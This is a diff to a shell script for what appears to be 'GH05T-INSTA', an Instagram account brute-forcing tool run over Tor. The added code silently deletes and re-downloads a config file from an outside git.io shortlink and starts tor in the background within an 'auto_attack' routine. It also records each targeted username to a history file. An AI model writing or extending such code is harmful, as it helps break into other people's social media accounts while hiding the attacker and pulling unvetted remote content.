@@ -15,6 +15,29 @@ tornotice() {
 	sleep 5
 }
 
+reopens() {
+	rm ~/instapy-config.json >/dev/null 2>&1
+	if [ -f ~/instapy-config.json ]; then
+		rm -r ~/instapy-config.json >/dev/null 2>&1
+	else
+		echo ''
+	fi
+	if [ -f instapy-config.json ]; then
+		rm instapy-config.json
+	else
+		echo ''
+	fi	
+}
+
+brutejson() {
+	wget -O ~/instapy-config.json "https://git.io/v5DGy" >/dev/null 2>&1
+	if [ -f ~/instapy-config.json ]; then
+		echo ''
+	else
+		cd ~
+		wget -O ~/instapy-config.json "https://git.io/v5DGy" >/dev/null 2>&1
+	fi
+}
 main_install() {
 	if [[ $(command -v php) && $(command -v curl) && $(command -v python) && $(command -v python2) && $(command -v wget) && $(command -v tor) ]]; then
 		echo -e ""
@@ -158,7 +181,9 @@ function auto_attack() {
 		sleep 2
 		auto_attack
 	fi
+	brutejson
 	tornotice
+	tor > /dev/null 2>&1 &
 	clear
 	echo "User : $username" >> /usr/cookies/history.txt
 	echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
